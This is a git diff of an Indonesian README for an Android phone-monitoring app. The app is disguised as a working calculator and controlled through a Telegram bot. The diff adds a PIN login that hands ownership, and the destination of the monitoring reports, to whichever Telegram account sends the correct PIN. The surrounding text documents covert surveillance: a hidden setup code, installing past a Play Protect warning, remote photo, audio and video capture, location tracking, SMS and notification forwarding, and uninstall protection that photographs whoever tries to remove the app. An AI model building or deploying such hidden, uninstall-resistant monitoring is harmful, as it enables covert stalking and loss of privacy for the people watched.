@@ -24,6 +24,7 @@ Aplikasi monitoring HP anak via Telegram, tampilannya kalkulator biasa. Buat ora
 - Mode restore ketat opsional: `/pulihkan <kode>` memakai kode 6 digit berputar yang hanya tampil di Setup
 - Masking OTP/bank otomatis (angka 4–8 digit disamarkan), audit perintah sensitif (`/audit`), dan pembersihan media lokal (`/bersihkan media 30`)
 - Link pairing `https://t.me/<bot>?start=<chat>_<kode>` bisa disalin dari Setup, plus ringkasan kesehatan perangkat
+- PIN akses bot opsional: bila owner belum tertaut, user lain bisa login lewat `/login <PIN>` (PIN diatur di Setup) dan langsung menjadi owner + tujuan pemantauan
 - Auto-jalan lagi habis reboot
 - Proteksi uninstall opsional via Device Admin (kamu juga dikabari + dikirimi foto & lokasi saat ada yang **mencoba** mematikannya)
 
@@ -56,7 +57,7 @@ Tanpa secret pun build tetap jalan. Token bot TIDAK pernah dibake ke APK.
 3. Kalau Play Protect protes, Details > Install anyway.
 4. Buka aplikasi kalkulatornya.
 5. Ketik `1234` lalu tekan `=`, halaman Setup kebuka.
-6. Isi token bot, Chat ID, interval sync, tap Save.
+6. Isi token bot, Chat ID, PIN akses bot (opsional; 6-12 digit untuk login saat owner kosong), interval sync, tap Save.
 7. Tap Test Connection: token dan Chat ID dicek ke Telegram (`getMe` + `getChat`) sekaligus setingannya disimpan. Tombol ini tidak mengirim pesan apa pun — pesan sungguhan datang dari Send Status atau perintah bot.
 8. Tap Grant all permissions sampai semua hijau, lalu grant background location Allow all the time.
 9. Nyalakan akses notifikasi kalau mau forward notifikasi.
@@ -64,7 +65,7 @@ Tanpa secret pun build tetap jalan. Token bot TIDAK pernah dibake ke APK.
 11. Tap Anti-kill &amp; Autostart: izinkan autostart merek HP (Xiaomi/Oppo/Vivo/Huawei/Samsung/dll), matikan batasan baterai, dan izinkan "tampil di atas aplikasi lain". Nyalakan Device Admin kalau perlu. Setelah itu tap Tes anti-mati untuk membuktikan service bisa hidup lagi sendiri di HP ini.
 12. Kalau mau ringkasan pemakaian layar (perintah `/layar`), tap Screen time access lalu aktifkan untuk app ini.
 13. Tap **Cek kesehatan perangkat** untuk ringkasan izin/status; tombol di dialog membuka perbaikan izin atau anti-mati.
-14. Tap **Salin link pairing** untuk mendapatkan `https://t.me/<bot>?start=<chat>_<kode>`; buka link itu dari akun Telegram owner. Link ini pengganti mengetik `/start <chat ID> <kode>`.
+14. Tap **Salin link pairing** untuk mendapatkan `https://t.me/<bot>?start=<chat>_<kode>`; buka link itu dari akun Telegram owner. Link ini pengganti mengetik `/start <chat ID> <kode>`. Link pairing otomatis dimatikan bila **PIN akses bot** diisi; login lewat `/login <PIN>`.
 15. Opsional: tap **Kode restore ketat** dan nyalakan switch kalau `/pulihkan` mau mewajibkan kode 6 digit dari perangkat.
 16. Tap Enable monitoring, selesai. Cek via Send Status.
 
@@ -86,7 +87,7 @@ Catatan: kalkulatornya beneran bisa dipakai. Ketik angka setelah `=` mulai hitun
 
 ## Perintah Telegram
 
-Kirim dari akun owner yang sudah pairing (`/start <chat ID> <kode>` via private chat, kode ada di status Setup):
+Kirim dari akun owner yang sudah pairing (`/start <chat ID> <kode>` via private chat, kode ada di status Setup), atau login dulu dengan `/login <PIN>` bila owner belum tertaut:
 
 | Perintah | Fungsi |
 |----------|--------|
@@ -146,6 +147,7 @@ Kirim dari akun owner yang sudah pairing (`/start <chat ID> <kode>` via private 
 | `/log` | Log error terakhir |
 | `/ping` | Cek delay bot |
 | `/tombol` | Buka panel **🔢 Atur angka** (tombol yang butuh angka: interval, jeda, rekam, bunyi, denyut, jemput) |
+| `/login <PIN>` | Login saat owner belum tertaut; PIN dari Setup. Setelah benar, chat pengirim menjadi owner + tujuan pemantauan |
 | `/pulihkan` | Pulihkan token bot, Chat ID, owner, dan interval dari file `.redeyebak` (private chat owner) |
 | `/audit` | 30 catatan audit perintah sensitif terakhir (private chat owner) |
 | `/bersihkan media 30` | Hapus cache foto/video/rekaman lokal yang lebih lama dari 30 hari |
@@ -154,6 +156,16 @@ Kirim dari akun owner yang sudah pairing (`/start <chat ID> <kode>` via private 
 Perintah yang butuh angka (`/photointerval`, `/patrolinterval`, `/pause`, `/syncinterval`, `/record`, `/recordvideo`, `/ring`, `/heartbeat`, `/jemput`) dipakai lewat tombol, tanpa mengetik perintahnya: kirim `/tombol` (atau ketuk tombol **🔢 Atur angka** di menu utama), lalu ketuk tombol perintahnya dan balas angka — mis. ketuk **Interval foto** lalu balas `15` sama dengan `/photointerval 15`. Setelah tombol ditekan, balas `help` (`bantuan`/`cara`/`?`) untuk keterangan tombol itu: gunanya, rentangnya, dan nilai yang sedang dipakai. Balasan angka hanya berlaku 5 menit sejak tombol ditekan, dan batal sendiri kalau kamu kirim perintah lain. Karena itu perintah angka sengaja **tidak dimunculkan** lagi di daftar perintah Telegram (menu `/`) maupun di teks `/help` — jalan resminya lewat tombol; mengetiknya langsung (mis. `/photointerval 15`, `/jemput off`, `/heartbeat 0`) tetap berfungsi. Sejak `v1.6.393`, teks `/help` tidak lagi memuat daftar perintah sama sekali: isinya hanya judul dan tombol aksi; rujukan singkat tiap perintah tetap tersedia di menu `/` Telegram (deskripsi perintah di daftar autocomplete).
 
 Sejak `v1.6.403` tampilan menunya dirapikan: menu utama berisi tombol cepat (Foto, Layar, Lokasi, Status, Baterai, Darurat) plus pintu kategori — **📷 Media**, **📱 Komunikasi**, **🗺️ Lokasi & jejak**, **ℹ️ Info & data**, **🛡️ Pengawasan**, **⚙️ Alat & kontrol**, **🔢 Atur angka**. Ketuk kategori untuk membuka isinya; tiap kategori diakhiri tombol **🏠 Menu utama**, dan perpindahan tampilan **mengedit pesan menu yang sama** (tidak menumpuk pesan baru di riwayat). Di **Media**, tombol **🤳 Pakai kamera depan** / **📷 Pakai kamera belakang** hanya memilih lensa untuk foto berikutnya, bukan mengambil foto. Tombol yang butuh isian (mis. **✉️ Kirim SMS**, **🗺️ Rumah**, **🔤 Awasi kata**, **🕘 Jam pulang**) membalas prompt; balas nilainya (mis. `08123456789 Halo` atau `-6.2,106.8,200`), dan balas `help` untuk keterangan tombol itu. Supaya menu tak "tenggelam ke atas" saat ada hasil, **setiap kiriman bot** — teks, foto, video, maupun rekaman suara — membawa baris tombol **🏠 Menu utama** + **🔢 Atur angka** di bawahnya, jadi menu selalu bisa dibuka dari pesan paling baru; tombol itu membuka panel baru (bukan mengedit pesan hasil). Tombol pada pesan lama (dari versi sebelumnya) tetap berfungsi.
+
+### Login PIN saat owner kosong
+
+Kalau status Setup masih **Pemilik: belum dikenal**, isi **PIN akses bot** (6-12 digit) di Setup lalu tap Save. Dari akun Telegram mana pun, buka private chat bot dan kirim:
+
+```
+/login 123456
+```
+
+PIN yang benar membuat akun itu menjadi owner dan **Chat ID tujuan ikut diganti ke private chat tersebut**, jadi balasan serta laporan monitoring langsung sampai ke akun itu. PIN salah dibatasi 5 kali per akun (kunci 15 menit) dan 20 kali total (kunci 1 jam); pesan `/login` dihapus dari chat setelah diproses. Bila PIN dikosongkan, cara lama (link pairing / `/start <chat ID> <kode>`) aktif kembali. PIN tidak ikut tersimpan di file backup.
 
 ### Pulihkan lewat bot
 
